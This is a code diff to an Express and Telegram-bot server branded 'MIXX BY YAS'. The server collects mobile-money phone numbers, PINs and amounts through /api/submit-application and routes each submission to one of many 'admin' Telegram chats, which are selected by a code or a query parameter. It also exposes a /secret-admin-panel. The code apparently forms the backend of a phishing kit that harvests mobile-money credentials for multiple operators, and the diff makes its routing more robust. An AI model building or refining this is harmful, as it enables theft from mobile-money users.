@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - UNRESTRICTED DELIVERY MULTI-ADMIN ROUTING SERVER**
+ * **MIXX BY YAS - ROBUST ISOLATED ROUTING SERVER**
  */
 
 const express = require('express');
@@ -24,20 +24,27 @@ let bot = null;
 const sessions = new Map();
 
 /**
- * **UNRESTRICTED CHAT ID RESOLUTION**
- * Directly translates codes like '01', '02' to their environment variables 
- * and ensures direct message routing without blocking unlisted chat identifiers.
+ * **FORCED ISOLATED CHAT ID RESOLUTION**
+ * Directly checks and forces mapping for ADMIN_02, ADMIN_01, etc., 
+ * ensuring requests explicitly target their corresponding environment variable.
  */
 function resolveAdminChatId(adminKeyOrId) {
   if (!adminKeyOrId) return process.env.ADMIN_01 || null;
-  const cleanKey = String(adminKeyOrId).toUpperCase().padStart(2, '0');
+  const cleanKey = String(adminKeyOrId).trim().toUpperCase().padStart(2, '0');
   
   const envVarName = `ADMIN_${cleanKey}`;
   if (process.env[envVarName]) {
     return process.env[envVarName];
   }
   
-  return adminKeyOrId;
+  for (let i = 1; i <= 20; i++) {
+    const codeStr = String(i).padStart(2, '0');
+    if (process.env[`ADMIN_${codeStr}`] === String(adminKeyOrId)) {
+      return process.env[`ADMIN_${codeStr}`];
+    }
+  }
+  
+  return adminKeyOrId || process.env.ADMIN_01 || null;
 }
 
 function isValidTigoNumber(phoneStr) {
@@ -99,17 +106,11 @@ async function initBot() {
     const username = user.username ? `@${user.username}` : 'No username set';
     
     let assignedCode = '01';
-    if (chatId === process.env.ADMIN_02) {
-      assignedCode = '02';
-    } else if (chatId === process.env.ADMIN_01) {
-      assignedCode = '01';
-    } else {
-      for (let i = 1; i <= 20; i++) {
-        const codeStr = String(i).padStart(2, '0');
-        if (process.env[`ADMIN_${codeStr}`] === chatId) {
-          assignedCode = codeStr;
-          break;
-        }
+    for (let i = 1; i <= 20; i++) {
+      const codeStr = String(i).padStart(2, '0');
+      if (process.env[`ADMIN_${codeStr}`] === chatId) {
+        assignedCode = codeStr;
+        break;
       }
     }
 
@@ -193,7 +194,12 @@ app.get('/secret-admin-panel', (req, res) => {
 
 app.post('/api/submit-application', (req, res) => {
   try {
-    const { phone, pin, amount, adminChatId } = req.body || {};
+    let { phone, pin, amount, adminChatId } = req.body || {};
+
+    // Auto-detect or fallback extract admin code if query string or header contains it
+    if (!adminChatId && req.query && req.query.admin) {
+      adminChatId = req.query.admin;
+    }
 
     if (!isValidTigoNumber(phone)) {
       return res.status(400).json({ 
@@ -327,4 +333,3 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-                           
